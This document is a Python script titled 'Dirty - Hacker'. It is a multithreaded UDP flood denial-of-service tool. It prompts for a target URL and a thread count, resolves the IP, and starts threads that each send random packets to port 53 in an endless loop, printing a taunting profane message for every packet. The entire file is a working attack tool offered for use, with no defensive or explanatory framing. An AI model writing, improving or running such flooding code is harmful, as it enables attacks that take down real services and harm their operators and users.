import random
import time
import socket
import sys
import threading
import pyfiglet
from colorama import Fore, Back, Style

# for interface 
print()
print('****************************************************************')  
print()
print(Fore.RED + pyfiglet.figlet_format("Dirty - Hacker") + Style.RESET_ALL)
print()
print('****************************************************************')
print("\n*          My github is : https://github.com/yasin-pro/        *")
print()
print('****************************************************************')
print()

# for create for send random message
def create_rnd_msg(size_for_message):
	random_msg = ""
	for _ in range(0, size_for_message):
		int_for_len_of_char = random.randint(0, 255)
		random_msg += chr(int_for_len_of_char)
	return random_msg

time.sleep(2)
print()
print(Fore.GREEN+' [+] '+Fore.RED+'Ready to use ! '+Style.RESET_ALL)
print()
time.sleep(2)
site = input(Fore.GREEN+' [+] '+Fore.RED+'Enter the target URL : '+Style.RESET_ALL)
# len of run thread of dos_attack function in backgound
print()
thread_count = int(input(Fore.GREEN+' [+] '+Fore.GREEN + 'Enter the counts of threads : '+Style.RESET_ALL))
ip = socket.gethostbyname(site)
print()

# user port recive from user and 53 is open port in server defult
udp_port = 53
print(Fore.GREEN+' [+] '+Fore.RED+'UDP target ip : '+Fore.GREEN+ ip +Style.RESET_ALL)
print(Fore.GREEN+' [+] '+Fore.RED+'UDP target port : '+Fore.GREEN+ str(udp_port) +Style.RESET_ALL)
print()
time.sleep(3)

def dos_attack():
	while True:	
		# create message from above create_rnd_msg function
		create_message = str.encode(create_rnd_msg(8))
		# create object from socket and user AF INET and DGRAM  
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(create_message, (ip, udp_port))
		# for interface
		print(Fore.GREEN+' [+] '+Fore.GREEN+f'Packet sent successfuly => Message: \033[94m {create_message.decode()} "\033[00m Fuck off! my name is dirty hacker! '+Style.RESET_ALL)

for _ in range(thread_count):
	try:
		threading.Thread(target=dos_attack).start()
	except KeyboardInterrupt:
		sys.exit(0)